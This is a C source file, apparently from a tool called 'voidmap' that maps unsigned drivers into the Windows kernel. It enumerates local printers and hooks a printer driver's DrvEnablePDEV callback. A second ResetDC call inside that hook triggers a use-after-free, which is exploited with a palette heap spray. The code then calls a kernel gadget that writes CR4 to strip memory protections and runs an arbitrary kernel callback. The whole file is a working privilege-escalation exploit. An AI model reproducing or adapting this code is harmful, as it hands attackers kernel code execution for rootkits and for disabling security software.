#include "general.h"

typedef BOOL(*DrvEnableDriver_t)(ULONG version, ULONG cj, DRVENABLEDATA* pded);
typedef DHPDEV(*DrvEnablePDEV_t)(DEVMODEW* pdm, LPWSTR pwszLogAddress, ULONG cPat, HSURF* phsurfPatterns, ULONG cjCaps, ULONG* pdevcaps, ULONG cjDevInfo, DEVINFO* pdi, HDEV hdev, LPWSTR pwszDeviceName, HANDLE hDriver);
typedef void(*VoidFunc_t)();

DHPDEV HookedFunction(DEVMODEW* pdm, LPWSTR pwszLogAddress, ULONG cPat, HSURF* phsurfPatterns, ULONG cjCaps, ULONG* pdevcaps, ULONG cjDevInfo, DEVINFO* pdi, HDEV hdev, LPWSTR pwszDeviceName, HANDLE hDriver);
PFN originalFunction;
BOOL shouldTrigger = FALSE;
HDC dummy;
char printerName[0x100];

DWORD64 argument;
DWORD64 targetFunction;

void SprayPalettes(DWORD size)
{
    DWORD count = (size - 0x90) / 4;
    DWORD paletteSize = sizeof(LOGPALETTE) + (count - 1) * sizeof(PALETTEENTRY);
    LOGPALETTE* palette = malloc(paletteSize);
    if (!palette) 
    {
        ConsoleError("Failed to allocate buffer!");
        return;
    }

    DWORD64* p = (DWORD64*)((DWORD64)palette + 4);
    for (DWORD i = 0; i < 0x120; i++) 
        p[i] = argument;

    for (DWORD i = 0x120; i < (paletteSize - 4) / 8; i++)
        p[i] = targetFunction;

    palette->palNumEntries = (WORD)count;
    palette->palVersion = 0x300;

    for (DWORD i = 0; i < 0x5000; i++)
        CreatePalette(palette);
}

DHPDEV HookedFunction(DEVMODEW* pdm, LPWSTR pwszLogAddress, ULONG cPat, HSURF* phsurfPatterns, ULONG cjCaps, ULONG* pdevcaps, ULONG cjDevInfo, DEVINFO* pdi, HDEV hdev, LPWSTR pwszDeviceName, HANDLE hDriver)
{
    ConsoleSuccess("Hooked function called");

    ConsoleInfo("Calling original...");
    DHPDEV original = ((DrvEnablePDEV_t)originalFunction)(pdm, pwszLogAddress, cPat, phsurfPatterns, cjCaps, pdevcaps, cjDevInfo, pdi, hdev, pwszDeviceName, hDriver);
    ConsoleSuccess("Original return: 0x%p", original);

    if (!shouldTrigger)
    {
        ConsoleWarning("Skipped exploit trigger");
        return original;
    }
    
    shouldTrigger = FALSE;

    ConsoleInfo("Triggering UAF with second reset...");
    HDC temp = ResetDCW(dummy, NULL);
    ConsoleSuccess("Returned from second reset: 0x%p", temp);

    ConsoleInfo("Spraying palettes...");
    SprayPalettes(0xe20);
    ConsoleSuccess("Spaying done");

    return original;
}

BOOL SetupHooks()
{
    ConsoleInfo("Finding printers...");
    DWORD pcbNeeded;
    DWORD pcbReturned;
    EnumPrintersA(PRINTER_ENUM_LOCAL, NULL, 4, NULL, 0, &pcbNeeded, &pcbReturned);
    if (pcbNeeded <= 0)
    {
        ConsoleError("Failed to find any printers!");
        return -1;
    }

    PRINTER_INFO_4A* printerEnum = malloc(pcbNeeded);
    if (!printerEnum)
    {
        ConsoleError("Failed allocate buffer from printer enumeration!");
        return -1;
    }

    BOOL status = EnumPrintersA(PRINTER_ENUM_LOCAL, NULL, 4, (LPBYTE)printerEnum, pcbNeeded, &pcbNeeded, &pcbReturned);
    if (!status || pcbReturned <= 0)
    {
        ConsoleError("Failed to enumerate printers!");
        return -1;
    }

    ConsoleSuccess("Printer info count: %llu", pcbReturned);

    for (DWORD i = 0; i < pcbReturned; i++)
    {
        PRINTER_INFO_4A* currentPrinter = &printerEnum[i];

        ConsoleInfo("Opening printer %s...", currentPrinter->pPrinterName);
        strcpy(printerName, currentPrinter->pPrinterName);
        HANDLE printerHandle;
        status = OpenPrinterA(currentPrinter->pPrinterName, &printerHandle, NULL);
        if (!status)
        {
            ConsoleError("Failed to open printer!");
            continue;
        }

        ConsoleSuccess("Printer handle: 0x%p", printerHandle);

        ConsoleInfo("Getting printer driver...");

        GetPrinterDriverA(printerHandle, NULL, 2, NULL, 0, &pcbNeeded);
        DRIVER_INFO_2A* driverInfo = malloc(pcbNeeded);
        if (!driverInfo)
        {
            ConsoleError("Failed to allocate buffer!");
            continue;
        }

        status = GetPrinterDriverA(printerHandle, NULL, 2, (LPBYTE)driverInfo, pcbNeeded, &pcbNeeded);
        if (!status)
        {
            ConsoleError("Failed to get printer driver!");
            continue;
        }

        ConsoleSuccess("Driver name: %s dll: %s", driverInfo->pName, driverInfo->pDriverPath);

        ConsoleInfo("Loading printer driver module...");
        HMODULE printerDriverModule = LoadLibraryExA(driverInfo->pDriverPath, NULL, LOAD_WITH_ALTERED_SEARCH_PATH);
        if (printerDriverModule == NULL)
        {
            ConsoleError("Failed to load printer driver module!");
            continue;
        }

        ConsoleSuccess("Loaded module: 0x%p", printerDriverModule);

        ConsoleInfo("Getting exports...");
        DrvEnableDriver_t DrvEnableDriver = (DrvEnableDriver_t)GetProcAddress(printerDriverModule, "DrvEnableDriver");
        VoidFunc_t DrvDisableDriver = (VoidFunc_t)GetProcAddress(printerDriverModule, "DrvDisableDriver");
        if (!DrvEnableDriver || !DrvDisableDriver)
        {
            ConsoleError("Failed to get exports!");
            continue;
        }

        ConsoleSuccess("DrvEnableDriver: 0x%p DrvDisableDriver: 0x%p", DrvEnableDriver, DrvDisableDriver);

        ConsoleInfo("Enabling driver...");
        DRVENABLEDATA enableData;
        status = DrvEnableDriver(DDI_DRIVER_VERSION_NT4, sizeof(DRVENABLEDATA), &enableData);
        if (!status)
        {
            ConsoleError("Failed to enable driver!");
            continue;
        }

        ConsoleSuccess("Enabled driver");

        ConsoleInfo("Setting custom protection on callback table...");
        DWORD oldProtection;
        status = VirtualProtect(enableData.pdrvfn, enableData.c * sizeof(PFN), PAGE_READWRITE, &oldProtection);
        if (!status)
        {
            ConsoleError("Failed to set protection on callback table!");
            continue;
        }

        ConsoleSuccess("Custom protection set");

        ConsoleInfo("Looping callback table...");
        BOOL found = FALSE;
        for (DWORD n = 0; n < enableData.c; n++)
        {
            ULONG iFunc = enableData.pdrvfn[n].iFunc;
            if (iFunc == INDEX_DrvEnablePDEV)
            {
                originalFunction = enableData.pdrvfn[n].pfn;
                enableData.pdrvfn[n].pfn = (PFN)HookedFunction;
                found = TRUE;
                break;
            }
        }

        if (found)
        {
            ConsoleSuccess("Replaced function pointer");
        }
        else
        {
            ConsoleError("Desired function not found!");
            return -1;
        }

        ConsoleInfo("Disabling driver...");
        DrvDisableDriver();
        ConsoleSuccess("Disabled driver");

        ConsoleInfo("Reverting protection...");
        status = VirtualProtect(enableData.pdrvfn, enableData.c * sizeof(PFN), oldProtection, &oldProtection);
        if (!status)
        {
            ConsoleError("Failed to revert protection!");
            continue;
        }

        ConsoleSuccess("Protection reverted");

        return TRUE;
    }

    return FALSE;
}

void CallKernelFunction(PVOID function, DWORD64 rdx)
{
    ConsoleInfo("Attempting to call 0x%p with param %llu...", function, rdx);
    argument = rdx;
    targetFunction = (DWORD64)function;
    shouldTrigger = TRUE;
    ResetDC(dummy, NULL);
    ConsoleSuccess("Call might have succeeded");
}

int main(int argc, char* argv[])
{
    ConsoleTitle("voidmap");

    if (argc != 2)
    {
        ConsoleError("Invalid parameters; read README in official repo (github.com/SamuelTulach/voidmap)");
        return -1;
    }

    ConsoleInfo("Reading driver file...");
    const char* driverFilePath = argv[1];
    SIZE_T driverFileSize;
    PVOID driverBuffer = UtilsReadFile(driverFilePath, &driverFileSize);
    if (!driverBuffer)
    {
        ConsoleError("Failed to read driver file!");
        return -1;
    }

    PIMAGE_NT_HEADERS64 imageHeaders = UtilsGetImageHeaders(driverBuffer, driverFileSize);
    if (!imageHeaders)
    {
        ConsoleError("Invalid image file!");
        return -1;
    }

    ConsoleSuccess("Driver timestamp: %llu", imageHeaders->FileHeader.TimeDateStamp);

    ConsoleInfo("Getting kernel base...");
    PVOID kernelBase = UtilsGetModuleBase("ntoskrnl.exe");
    if (!kernelBase)
    {
        ConsoleError("Could not get kernel base address!");
        return -1;
    }

    ConsoleSuccess("Kernel base: 0x%p", kernelBase);

    ConsoleInfo("Loading kernel image locally...");
    HMODULE kernelHandle = LoadLibraryExA("ntoskrnl.exe", NULL, DONT_RESOLVE_DLL_REFERENCES);
    if (!kernelHandle)
    {
        ConsoleError("Failed to load kernel image locally!");
        return -1;
    }

    ConsoleSuccess("Local base: 0x%p", kernelHandle);

    ConsoleInfo("Resolving KeFlushCurrentTbImmediately...");
    DWORD64 gadget = (DWORD64)GetProcAddress(kernelHandle, "KeFlushCurrentTbImmediately");
    if (!gadget)
    {
        ConsoleError("Failed to load kernel image locally!");
        return -1;
    }

    ConsoleSuccess("KeFlushCurrentTbImmediately: 0x%p", gadget);

    ConsoleInfo("Resolving gadget address...");
    //
    // KeFlushCurrentTbImmediately + 0x17
    // mov     cr4, rcx
    // retn
    //
    gadget += 0x17;

    DWORD64 gadgetKernelAddress = (DWORD64)kernelBase + gadget - (DWORD64)kernelHandle;
    ConsoleSuccess("Gadget: 0x%p", gadgetKernelAddress);

    ConsoleInfo("Setting thread priority...");
    BOOL status = SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_HIGHEST);
    if (!status)
    {
        ConsoleError("Failed to set thread priority!");
        return -1;
    }

    ConsoleSuccess("Thread priority set");

    ConsoleInfo("Setting current process affinity...");
    DWORD_PTR originalAffinity = SetProcessAffinityMask(GetCurrentProcess(), 1 << 3);
    if (!originalAffinity)
    {
        ConsoleError("Failed to set thread affinity!");
        return -1;
    }

    ConsoleSuccess("Thread affinity set");

    status = SetupHooks();
    if (!status)
    {
        ConsoleError("Failed to setup hooks!");
        return -1;
    }

    ConsoleInfo("Creating device context...");
    dummy = CreateDCA(NULL, printerName, NULL, NULL);
    if (!dummy)
    {
        ConsoleError("Failed to create device context!");
        return -1;
    }

    ConsoleInfo("Zeroing out cr4...");
    CallKernelFunction((PVOID)gadgetKernelAddress, 0x00000000000506F8);

    ConsoleInfo("Calling mapper itself...");
    CallKernelFunction((PVOID)KernelCallback, 0);
}